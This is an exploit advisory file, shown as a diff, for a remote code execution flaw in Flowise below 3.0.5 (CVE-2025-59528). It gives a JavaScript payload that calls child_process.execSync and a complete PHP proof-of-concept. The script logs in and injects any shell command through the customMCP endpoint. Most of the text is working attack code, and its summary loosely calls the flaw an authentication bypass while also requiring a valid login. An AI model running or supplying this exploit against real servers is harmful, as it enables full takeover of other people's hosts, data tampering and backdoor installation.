@@ -1,0 +1,146 @@
+=============================================================================================================================================
+| # Title     : Flowise 3.0.4 php code injection                                                                                            |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://github.com/FlowiseAI/Flowise                                                                                        |
+=============================================================================================================================================
+
+[+] Summary : 
+
+FlowiseAI versions **below 3.0.5** contain a critical authentication‑bypass RCE vulnerability in the endpoint: /api/v1/node-load-method/customMCP
+
+After logging in with any valid account, an attacker can inject arbitrary JavaScript into the MCP handler, which is executed server‑side using NodeJS’s `child_process.execSync()`.
+
+This allows:
+
+- Full OS command execution  
+- Full takeover of the host machine  
+- Arbitrary file modification / deletion  
+- Backdoor installation  
+
+[+] References : ( https://packetstorm.news/files/id/211130/ & CVE-2025-59528 )
+
+
+[+] Technical Details
+
+The exploit abuses the **customMCP load method**, which blindly evaluates supplied JavaScript:
+
+```javascript
+({x:(function(){
+    const cp = process.mainModule.require("child_process");
+    cp.execSync("COMMAND_HERE");
+    return 1;
+})()})
+
+When posted to: POST /api/v1/node-load-method/customMCP
+
+Flowise executes the payload in the backend, giving full system control.
+
+
+1. Save the file as: poc.php
+
+2.Execute: php poc.php email@example.com "Password123" http://TARGET:3000 "id"
+
+
+[+]  POC
+
+<?php
+/*
+ * Flowise < 3.0.5 - (CVE-2025-59528)
+ * by: Indoushka
+ */
+
+function banner() {
+    echo "===============================================================================\n";
+    echo "  Flowise < 3.0.5 - Remote Code Execution (CVE-2025-59528)\n";
+    echo "  Original Author: nltt0\n";
+    echo "  PHP Version by: Indoushka\n";
+    echo "===============================================================================\n\n";
+}
+
+function login($email, $password, $url) {
+    $endpoint = rtrim($url, '/') . "/api/v1/auth/login";
+
+    $data = json_encode([
+        "email" => $email,
+        "password" => $password
+    ]);
+
+    $opts = [
+        "http" => [
+            "header" =>
+                "Content-Type: application/json\r\n" .
+                "x-request-from: internal\r\n",
+            "method" => "POST",
+            "content" => $data,
+            "ignore_errors" => true
+        ]
+    ];
+
+    $context = stream_context_create($opts);
+    $result = file_get_contents($endpoint, false, $context);
+
+    $cookies = "";
+    foreach ($http_response_header as $header) {
+        if (stripos($header, "Set-Cookie:") !== false) {
+            $cookies .= trim(substr($header, 11)) . "; ";
+        }
+    }
+
+    return $cookies;
+}
+
+function exploit($email, $password, $url, $cmd) {
+    $cookies = login($email, $password, $url);
+
+    if (!$cookies) {
+        echo "[✖] Login failed.\n";
+        return;
+    }
+
+    $endpoint = rtrim($url, '/') . "/api/v1/node-load-method/customMCP";
+
+    $payload = '({x:(function(){const cp=process.mainModule.require("child_process");cp.execSync("'.$cmd.'");return 1;})()})';
+
+    $postData = json_encode([
+        "loadMethod" => "listActions",
+        "inputs" => ["mcpServerConfig" => $payload]
+    ]);
+
+    $opts = [
+        "http" => [
+            "header" =>
+                "Content-Type: application/json\r\n" .
+                "Cookie: $cookies\r\n",
+            "method" => "POST",
+            "content" => $postData,
+            "ignore_errors" => true
+        ]
+    ];
+
+    $context = stream_context_create($opts);
+    file_get_contents($endpoint, false, $context);
+
+    echo "[✔] Command executed: $cmd\n";
+}
+
+banner();
+
+if ($argc < 5) {
+    echo "Usage: php {$argv[0]} <email> <password> <url> <cmd>\n";
+    echo "Example:\n";
+    echo "php {$argv[0]} admin@test.com 'Pass@2025' http://localhost:3000 'id'\n";
+    exit;
+}
+
+$email    = $argv[1];
+$password = $argv[2];
+$url      = $argv[3];
+$cmd      = $argv[4];
+
+exploit($email, $password, $url, $cmd);
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
